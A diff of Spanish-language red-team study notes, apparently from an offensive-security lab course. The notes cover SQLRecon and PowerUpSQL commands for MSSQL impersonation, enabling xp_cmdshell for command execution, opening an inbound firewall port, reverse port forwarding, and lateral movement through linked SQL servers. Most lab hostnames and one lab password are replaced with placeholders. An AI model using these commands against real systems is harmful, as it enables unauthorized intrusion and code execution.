@@ -340,6 +340,10 @@ remote-exec wmi PC C:\Windows\smb_x64.exe
 socks 1080
 ```
 ## Reverse Port Forwarding
+Habilitar firewall
+```
+powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+```
 ```
 rportfwd victim_port 127.0.0.1 attacker_port
 ```
@@ -494,7 +498,7 @@ execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a
 ```
 Ver los roles de otro usuario
 ```
-execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:DOMINIO /u:USER /p:PASS /h:INSTANCIA /m:whoami
 ```
 Ver los usuarios que son Admins de MSSQL
 ```
@@ -502,10 +506,10 @@ powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity
 ```
 Mirar el nombre del servidor
 ```
-execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:query /c:"select @@servername"
 ```
 ```
-powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
+powershell Get-SQLQuery -Instance "INSTANCIA" -Query "select @@servername"
 ```
 Acceder desde una maquina Linux con mssqlclient.py
 ```
@@ -531,12 +535,12 @@ EXECUTE AS login = 'domain\user'; SELECT SYSTEM_USER;
 ```
 Ejecutar SQLRecon con el usuario impersonado
 ```
-execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:HOST,1433 /m:iwhoami /i:DEV\mssql_svc
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:iwhoami /i:DEV\mssql_svc
 ```
 ## Command Execution
 Ejecutar codigo con PowerUpSQL
 ```
-powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+powershell Invoke-SQLOSCmd -Instance "INSTANCIA" -Command "whoami" -RawResults
 ```
 ### Query
 Mirar si XP_CMDSHELL esta activado
@@ -557,9 +561,50 @@ EXEC xp_cmdshell "whoami";
 ### SQLRecon
 Habilitar XP_CMDSHELL
 ```
-execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:ienablexp /i:DEV\mssql_svc
 ```
 Ejectuar codigo con XP_CMDSHELL
 ```
-execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
+```
+## Lateral Movement
+### Query
+Mirar los links de la instancia
+```
+SELECT srvname, srvproduct, rpcout FROM master..sysservers;
+```
+Ejecutar queries en otro servidor
+```
+SELECT * FROM OPENQUERY("HOST", 'select @@servername');
+```
+### SQLRecon
+Mirar los links de la instancia
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:links
+```
+Ejecutar queries en otro servidor
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA1 /m:lquery /l:HOST2 /c:"select @@servername"
+```
+Mirar permisos en otro servidor
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:lwhoami /l:HOST2
+```
+Mirar si XP_CMDSHELL esta activado en el otro servidor
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
+```
+Si XP_CMDSHELL esta desactivado, solo si está RPC OUT habilitado se podrá activar con
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [SERVIDOR]
+```
+```
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SERVIDOR]
+```
+Mirar si el otro serviodor tiene mas links
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
+```
+```
+powershell Get-SQLServerLinkCrawl -Instance "INSTANCIA1"
 ```
